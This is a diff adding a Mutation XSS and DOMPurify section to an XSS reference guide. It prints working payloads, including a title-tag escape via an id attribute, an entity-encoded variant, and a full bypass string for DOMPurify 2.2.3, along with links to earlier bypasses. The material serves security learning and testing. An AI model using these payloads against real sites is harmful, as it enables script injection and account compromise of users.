@@ -397,7 +397,7 @@ JQuery also has many other methods and CVEs if malicious input ends up in specif
 
 When placing common XSS payloads in the triggers above, it becomes clear that they are not all the same. Most notably, the `<img src onerror=alert()>` payload is the most universal as it works in every situation, even when it is not added to the DOM yet. The common and short `<svg onload=alert()>` payload is interesting as it is only triggered via `.innerHTML` on Chome, and not Firefox. Lastly, the `<script>` tag does not load when added with `.innerHTML` at all.
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption><p>Table of XSS payloads and DOM sinks that trigger them (<mark style="color:yellow;">yellow</mark> = Chrome but not Firefox)</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Table of XSS payloads and DOM sinks that trigger them (<mark style="color:yellow;">yellow</mark> = Chrome but not Firefox)</p></figcaption></figure>
 
 {% file src="../.gitbook/assets/domxss-trigger-table.html" %}
 **Source code** for script used to generate and test the results in the table above
@@ -748,4 +748,81 @@ location=name
 ```
 {% endcode %}
 
-TODO: link to JavaScript here and fix SMTP injection code highlighting
+### Mutation XSS & DOMPurify
+
+Mutation XSS is a special kind of XSS payload where you are **abusing a difference in the checking environment vs. the destination environment**. There are some special browser rules for when HTML finds itself in certain tags, that are different from inside other tags. This difference can sometimes be abused to create a benign payload in the checking context but will be mutated by the browser in a different context into a malicious payload.
+
+Let's take the following example: The [DOMPurify](https://github.com/cure53/DOMPurify) sanitizer is used to filter out malicious content that could trigger JavaScript execution, which it does perfectly on the following string:
+
+{% code title="DOMPurify" %}
+```html
+<p id="</title><img src=x onerror=alert()>"></p>
+```
+{% endcode %}
+
+There is a `<p>` tag with `"</title><img src=x onerror=alert()>"` as its `id=` attribute, nothing more, and nothing that would trigger JavaScript surely. But then comes along the browser, which sees this payload placed into the DOM, inside the existing `<title>` tag:
+
+<pre class="language-html" data-title="Browser DOM"><code class="lang-html">&#x3C;title>
+<strong>    &#x3C;p id="&#x3C;/title>&#x3C;img src=x onerror=alert()>">&#x3C;/p>
+</strong>&#x3C;/title>
+</code></pre>
+
+Perhaps surprisingly, it is **parsed differently** now that it is inside of the `<title>` tag. Instead of a simple `<p>` tag with an `id=` attribute, this turned into the following after mutation:
+
+{% code title="Browser DOM after mutation" %}
+```html
+<html><head><title>
+    &lt;p id="</title></head><body><img src="x" onerror="alert()">"&gt;<p></p>
+</body></html>
+```
+{% endcode %}
+
+See what happened here? It suddenly closed with the `</title>` tag and started an `<img>` tag with the malicious `onerror=` attribute, executing JavaScript, and causing XSS! This means in the following example, `alert(1)` fires but `alert(2)` does not:
+
+<pre class="language-html" data-title="Demo"><code class="lang-html">&#x3C;title>
+<strong>    &#x3C;p id="&#x3C;/title>&#x3C;img src=x onerror=alert(1)>">&#x3C;/p>
+</strong>&#x3C;/title>
+<strong>&#x3C;p id="&#x3C;/title>&#x3C;img src=x onerror=alert(2)>">&#x3C;/p>
+</strong></code></pre>
+
+DOMPurify does not know of the `<title>` tag the application puts it in later, so it can only say if the HTML is safe on its own. In this case, it is, so we bypass the check through Mutation XSS.&#x20;
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>Example from <a href="https://mizu.re/post/intigriti-october-2023-xss-challenge">mizu.re's writeup</a> showing the difference between the browser and DOMPurify</p></figcaption></figure>
+
+A quick for-loop later we can find that this same syntax works for all these tags:\
+`iframe`, `noembed`, `noframes`, `noscript`, `script`, `style`, `textarea`, `title`, `xmp`
+
+These types of Mutation XSS tricks are highly useful in bypassing simpler sanitizer parsers because DOMPurify had to really put in some effort to get this far. Writing payloads that put the real XSS in an attribute and use mutation to escape out of it can be unexpected and the developers may not have thought about the possibility, and only use some regexes or naive parsing.&#x20;
+
+Where this gets really powerful is using HTML encoding if the sanitizer parses the payload, and then reassembles the HTML afterward, for example:
+
+<pre class="language-html"><code class="lang-html"><strong>&#x3C;title>&#x3C;p id="&#x26;lt;&#x26;sol;title&#x26;gt;&#x26;lt;img src&#x26;equals;x onerror&#x26;equals;alert&#x26;lpar;&#x26;rpar;&#x26;gt;">&#x3C;/p>&#x3C;/title>
+</strong>&#x3C;!-- could be serialized back into this Mutation XSS -->
+&#x3C;title>&#x3C;p id="&#x3C;/title>&#x3C;img src=x onerror=alert()>">&#x3C;/p>&#x3C;/title>
+</code></pre>
+
+#### DOMPurify outdated versions
+
+While the abovementioned tricks can get around specific situations, an _outdated version_ of the [`dompurify`](https://www.npmjs.com/package/dompurify) library can cause every output to be vulnerable by completely bypassing DOMPurify in a regular context. The **latest vulnerable version is 2.2.3** with a complete bypass found by [@TheGrandPew](https://twitter.com/TheGrandPew) in _dec. 2020_. The following payload will trigger `alert()` when sanitized and put into a regular part of the DOM:
+
+{% code title="DOMPurify 2.2.3 Bypass" overflow="wrap" %}
+```html
+<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style><img src onerror=alert()>">
+```
+{% endcode %}
+
+{% hint style="info" %}
+**Earlier Proof of Concepts**:
+
+[**< 2.2.4** - TheGrandPew](https://twitter.com/TheGrandPew/status/1336901666285604866)\
+[**< 2.2.3** - TheGrandPew](https://twitter.com/TheGrandPew/status/1336901666285604866)\
+[**< 2.2.2** - Daniel Santos](https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f)\
+[**< 2.1** - Gareth Heyes](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)\
+[**< 2.0.17** - Michał Bentkowski](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/)
+{% endhint %}
+
+#### Resources
+
+* Easy-to-follow Google Search mXSS: [https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
+* Finding a custom variation of an outdated DOMPurify bypass: [https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/#let%E2%80%99s-find-a-custom-variation-of-the-bypass)
+* More complex Universal mXSS: [https://twitter.com/garethheyes/status/1723047393279586682](https://twitter.com/garethheyes/status/1723047393279586682)
